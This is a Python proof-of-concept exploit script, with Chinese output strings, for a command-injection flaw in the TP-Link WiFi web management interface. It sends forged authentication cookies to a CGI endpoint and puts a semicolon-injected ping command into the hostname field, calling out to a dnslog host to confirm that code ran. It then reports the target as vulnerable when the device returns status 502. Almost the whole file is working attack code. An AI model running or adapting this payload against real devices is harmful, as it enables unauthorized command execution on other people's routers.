#!/usr/bin/python
#-*- coding:utf-8 -*-

import click
import requests


def title():
    print('+------------------------------------------')
    print('+  作者：quanpangshu                       ')
    print('+  漏洞名称：TP-Link WIFI WEB管理命令执行漏洞')
    print('+  使用格式:  python3 poc.py   --help       ')
    print('+------------------------------------------')


def scan(host):
    url = str(host)+"/cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "cooLogin=1; cooUser=1"
    }
    payload = "call_function=ping&iface=eth0&hostname= %3bping 5dsdj4.dnslog.cn"

    try:
        rep = requests.post(url=url, headers=headers, data=payload, timeout=70, verify=False)
    except:
        print("漏洞不存在")
    if rep.status_code == 502:
        print("漏洞存在！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！"
              "请前往dnslog平台再次确认!!!!!!!!!!!!!!!!!!!!!!!")
    else:
        print("漏洞不存在")


@click.command()
@click.option("-h", "--host", help='Target URL; Example:http://ip:port。')
def main(host):
    title()
    scan(host)


if __name__ == '__main__':
    main()